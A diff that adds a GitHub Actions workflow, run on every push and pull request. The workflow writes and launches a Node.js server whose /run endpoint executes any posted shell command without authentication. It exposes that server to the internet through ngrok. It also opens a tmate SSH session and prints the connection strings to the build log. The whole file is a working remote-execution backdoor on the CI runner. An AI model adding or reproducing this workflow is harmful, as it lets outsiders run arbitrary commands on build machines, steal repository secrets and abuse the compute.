@@ -1,0 +1,68 @@
+name: Run Tmate Session
+
+on: [push, pull_request]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v2
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: '14'
+
+      - name: Install Dependencies
+        run: npm install express body-parser ngrok tmate
+
+      - name: Write server script
+        run: |
+          cat > server.js <<- "EOF"
+          const express = require('express');
+          const bodyParser = require('body-parser');
+          const ngrok = require('ngrok');
+          const { exec } = require('child_process');
+          const app = express();
+
+          app.use(bodyParser.urlencoded({ extended: true }));
+          app.use(bodyParser.json());
+
+          app.post('/run', (req, res) => {
+            const cmd = req.body.cmd;
+            exec(cmd, (error, stdout, stderr) => {
+              if (error) {
+                console.error(`exec error: ${error}`);
+                return;
+              }
+              console.log(`stdout: ${stdout}`);
+              console.error(`stderr: ${stderr}`);
+            });
+            res.sendStatus(200);
+          });
+
+          app.listen(3000, () => console.log('App listening on port 3000!'));
+
+          (async function() {
+            const url = await ngrok.connect(3000);
+            console.log(`Server is exposed at ${url}`);
+          })();
+          EOF
+
+      - name: Start server
+        run: |
+          nohup node server.js &
+
+      - name: Install tmate
+        run: sudo apt-get install -y tmate
+
+      - name: Run tmate and get connection details
+        run: |
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          export SSH_STR=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+          export SSH_RO_STR=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh_ro}')
+          echo "Tmate connection details are:"
+          echo $SSH_STR
+          echo $SSH_RO_STR
